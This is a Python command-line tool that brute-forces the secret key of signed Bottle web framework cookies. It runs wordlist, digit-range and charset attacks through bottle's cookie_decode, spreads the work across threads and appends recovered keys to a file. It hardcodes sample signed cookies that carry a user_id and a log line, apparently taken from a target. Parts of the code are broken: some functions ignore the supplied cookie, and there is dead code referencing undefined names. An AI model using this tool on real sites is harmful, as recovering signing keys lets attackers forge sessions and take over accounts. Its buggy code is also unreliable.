import sys
import hashlib
import itertools
import threading
from bottle import cookie_decode

cookie = b"!BIvoux7ruCv+Z21jGBG4eg==?gASVIAAAAAAAAACMB3VzZXJfaWSUjBA5YjAwM2EwNDIzYzcxM2Y5lIaULg=="
cookie = b"!Pdp6x+atbZCu+tVxHb0SPA==?gAWVIAAAAAAAAACMB3VzZXJfaWSUjBA5YjAwM2EwNDIzYzcxM2Y5lIaULg=="
cookie = b"!SoF5leqlkQ8R52WQofVLnA==?gASVIAAAAAAAAACMB3VzZXJfaWSUjBBlMDFiZWJhMTA0MzA4OWFilIaULg=="
"""
2021-01-22T10:53:09.041980,SoF5leqlkQ8R52WQofVLnA==?gASVIAAAAAAAAACMB3VzZXJfaWSUjBBlMDFiZWJhMTA0MzA4OWFilIaULg==,SoF5leqlkQ8R52WQofVLnA==,gASVIAAAAAAAAACMB3VzZXJfaWSUjBBlMDFiZWJhMTA0MzA4OWFilIaULg==,4a817995eaa5910f11e76590a1f54b9c,e01beba1043089ab,482773-402258,80515
"""

EXAMPLE_COOKIE_RAW = b"!SoF5leqlkQ8R52WQofVLnA==?gASVIAAAAAAAAACMB3VzZXJfaWSUjBBlMDFiZWJhMTA0MzA4OWFilIaULg=="
EXAMPLE_COOKIE = EXAMPLE_COOKIE_RAW.decode()
METHOD_WORDLIST = 1
METHOD_DIGITS = 2
METHOD_CHARSET = 3
METHODS = {
    METHOD_WORDLIST: "wordlist",
    METHOD_DIGITS: "digits",
    METHOD_CHARSET: "charset",
}
METHOD_IDS = [str(method_id) for method_id in METHODS.keys()]
METHOD_NAMES = [method.lower() for method in METHODS.values()]

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def brute(thread_id, words):
    print("Starting thread ID #{}".format(thread_id))
    l = len(words)
    for i, word in enumerate(words):
        decoded = cookie_decode(cookie, word)
        print("#{} - [{}/{}] {}: {}".format(thread_id, i + 1, l, word, decoded))
        if decoded:
            print()
            print()
            print()
            print()
            print()
            print("==========================================")
            print("FOUND KEY:", word)
            with open("secret_key.txt", "a") as f:
                f.write(word + "\n")
            print("==========================================")
            print()
            print()
            print()
            print()
            print()
            print()
            exit(0)


def brute_digits(thread_id, start_length, end_length):
    print("Starting thread ID #{}".format(thread_id))
    l = "9" * end_length
    for i in range(int("1" + "0" * start_length), int("9" * (end_length + 1))):
        word = str(i)
        decoded = cookie_decode(cookie, word)
        print("#{} - [{}/{}] {}: {}".format(thread_id, i + 1, l, word, decoded), end="\r")
        if decoded:
            print()
            print()
            print()
            print()
            print()
            print("==========================================")
            print("FOUND KEY:", word)
            with open("secret_key.txt", "a") as f:
                f.write(word + "\n")
            print("==========================================")
            print()
            print()
            print()
            print()
            print()
            print()
            exit(0)



if len(sys.argv) == 1:
    print("[ERROR] Missing cookie argument")
    print("Usage: python3 bruteforce.py <cookie> <threads> <method> <options>")
    print("Example:")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 wordlist ./wordlist.txt")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 1 ./wordlist.txt")
    exit(1)

if len(sys.argv) == 2:
    print("[ERROR] Missing thread argument")
    print("Example:")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 wordlist ./wordlist.txt")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 1 ./wordlist.txt")
    exit(1)

if len(sys.argv) <= 3:
    print("[ERROR] Need to know method")
    print("Available methods:")
    for method_id, method in METHODS.items():
        print(f"\t{method_id}. {method}")
    print("Example:")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 wordlist ./wordlist.txt")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 1 ./wordlist.txt")
    exit(1)

raw_cookie = sys.argv[1].encode()
thread_count = int(sys.argv[2])
input_method = sys.argv[3]

if input_method not in METHOD_IDS and input_method not in METHOD_NAMES:
    print(f"{input_method} is not a valid method")
    print("Usage: python3 bruteforce.py <cookie> <threads> <method> <options>")
    print("Available methods:")
    for method_id, method in METHODS.items():
        print(f"\t{method_id}. {method}")
    print("Example:")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 wordlist ./wordlist.txt")
    print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 1 ./wordlist.txt")
    exit(1)

if input_method in METHOD_IDS:
    method_id = int(input_method)
else:
    method_id = [method_id for method_id, method_name in METHODS.items() if input_method == method_name][0]

method_name = METHODS[method_id]

print(f"Chosen method: {method_name}")

if method_id == METHOD_WORDLIST:
    if len(sys.argv) != 5:
        print("[ERROR] Missing wordlist argument")
        print(f"Usage: python3 bruteforce.py <cookie> <threads> {input_method} <wordlist>")
        print("Example:")
        print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 {input_method} ./wordlist.txt")
        exit(1)

    with open(sys.argv[4], "rb") as f:
        items = f.read().splitlines()


    item_count = len(items)
    items_per_thread = item_count // thread_count

    print(f"Found {item_count} items to go through")
    print(f"{items_per_thread} items per thread ({thread_count}) threads")

    threads = []
    chunked_items = list(chunks(items, items_per_thread))
    for i, items in enumerate(chunked_items):
        thread = threading.Thread(target=brute, args=(i + 1, items))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()


elif method_id == METHOD_DIGITS:
    if len(sys.argv) != 7:
        print("[ERROR] Missing arguments")
        print(f"Usage: python3 bruteforce.py <cookie> <threads> {input_method} <min_length> <max_length> <numbers_to_use>")
        print("Example:")
        print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 {input_method} 5 10 0123456789")
        print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 {input_method} 7 9 1234")
        exit(1)

    min_length = int(sys.argv[4])
    max_length = int(sys.argv[5])
    digits = sys.argv[6]

    print(f"Minimum length: {min_length}")
    print(f"Maximum length: {max_length}")
    print(f"Digits: {digits}")

    if min_length > max_length:
        print("[ERROR] min_length is larger than max_length")
        exit(1)

    brute_digits(1, min_length, max_length)
    exit(0)

    threads = []
    chunked_items = list(chunks(items, items_per_thread))

    print(len(c))
    for i, items in enumerate(chunked_items):
        thread = threading.Thread(target=brute, args=(i + 1, items))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()




    # TODO
elif method_id == METHOD_CHARSET:
    if len(sys.argv) != 7:
        print("[ERROR] Missing arguments")
        print(f"Usage: python3 bruteforce.py <cookie> <threads> {input_method} <min_length> <max_length> <charset>")
        print("Example:")
        print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 {input_method} 5 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
        print(f"python3 bruteforce.py '{EXAMPLE_COOKIE[:6]}...' 4 {input_method} 7 9 0123456789abcdefABCDEF")
        exit(1)

    min_length = int(sys.argv[4])
    max_length = int(sys.argv[5])
    charset = sys.argv[6]

    print(f"Minimum length: {min_length}")
    print(f"Maximum length: {max_length}")
    print(f"Charset: {charset}")

    if min_length > max_length:
        print("[ERROR] min_length is larger than max_length")
        exit(1)


    print("Generating permutations, this might take a while...")
    #a = itertools.permutations(charset)
    
    for length in range(min_length, max_length + 1):
        print(f"Starting bruteforce of length: {length}")
        for elem in itertools.product(charset, repeat=length):
            word = "".join(elem)
            print(word, end="\r")
            decoded = cookie_decode(raw_cookie, word)
            if decoded:
                print()
                print()
                print()
                print()
                print()
                print("==========================================")
                print("FOUND KEY:", word)
                with open("secret_key.txt", "a") as f:
                    f.write(word + "\n")
                print("==========================================")
                print()
                print()
                print()
                print()
                print()
                print()
                exit(0)
        print()
        print()
        print()

    exit(0)




item_count = len(items)
items_per_thread = item_count // thread_count

print(f"Found {item_count} items to go through")
print(f"{items_per_thread} items per thread ({thread_count}) threads")

exit(0)
threads = []
chunked_items = list(chunks(items, items_per_thread))
print(len(c))
for i, items in enumerate(chunked_items):
    thread = threading.Thread(target=brute, args=(i + 1, items))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()





